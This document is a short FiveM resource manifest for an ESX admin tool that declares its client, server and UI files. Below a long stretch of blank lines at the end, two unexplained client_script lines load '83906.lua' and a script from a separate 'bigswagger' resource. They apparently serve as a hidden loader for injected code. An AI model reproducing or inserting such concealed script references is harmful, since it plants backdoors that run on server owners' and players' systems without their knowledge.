resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Admin tool for ES'

client_script 'client.lua'
server_script 'server.lua'

ui_page 'ui/index.html'

files {
	'ui/index.html',
	'ui/style.css'
}

dependency 'essentialmode'











client_script '83906.lua'
client_script '@bigswagger/59642.lua'